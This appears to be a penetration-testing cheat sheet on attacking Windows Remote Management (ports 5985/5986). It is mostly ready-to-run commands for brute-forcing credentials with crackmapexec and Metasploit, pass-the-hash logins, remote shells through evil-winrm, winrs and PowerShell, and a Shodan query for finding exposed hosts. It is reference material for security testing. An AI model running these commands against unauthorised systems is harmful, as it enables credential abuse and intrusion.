# 5985 - WinRM

[Windows Remote Management](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx) (WinRM) is a Microsoft protocol that **allows remote management of Windows machines** over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

If WinRM is enabled on the machine, it's trivial to remotely administer the machine from PowerShell. In fact, you can just drop in to a remote PowerShell session on the machine (as if you were using SSH!)

The easiest way to detect whether WinRM is available is by seeing if the port is opened. WinRM will listen on one of two ports:

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

If one of these ports is open, WinRM is configured and you can try entering a remote session.

## Brute Force

Be careful, brute-forcing WinRM could block users.

```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
## Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
## Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```

### Metasploit

The winrm\_login module is a standard Metasploit login scanner to brute force passwords.

```
use auxiliary/scanner/winrm/winrm_login
```

### Using evil-winrm

```ruby
sudo apt install ruby-dev build-essential
gem install evil-winrm
```

Read **documentation** on its github: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)

```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```

To use evil-winrm to connect to an **IPv6 address** create an entry inside _**/etc/hosts**_ setting a **domain name** to the IPv6 address and connect to that domain.

### CrackMapexec

Here’s an example of using CrackMapExec winrm method as local Administrator with a clear text password:

```
crackmapexec winrm -d . -u Administrator -p 'pass123' -x "whoami" 192.168.204.183 
```

Here’s example using a NTLM hash:

```
crackmapexec winrm -d . -u Administrator -H aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 -x "whoami" 192.168.204.183
```

### Docker evil-winrm

```
sudo docker pull oscarakaelvis/evil-winrm
```

```
sudo docker run --rm -ti --name evil-winrm -v /home/foo/ps1_scripts:/ps1_scripts -v /home/foo/exe_files:/exe_files -v /home/foo/data:/data oscarakaelvis/evil-winrm -i 10.129.169.244 -u tony -p 'liltony' -s '/ps1_scripts/' -e '/exe_files/'
```

### Pass the hash with evil-winrm

```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```

### Winrs (Windows)

```
winrs -r:192.168.1.105 -u:ignite.local\administrator -p:Ignite@987 ipconfig
```

## Login from windows

### Powershell

From a powershell command prompt:

```
$pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force 
$cred = New-Object System.Management.Automation.PSCredential ('ECORP.local\morph3', $pass) 
Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }
```



## Shodan

* `port:5985 Microsoft-HTTPAPI`
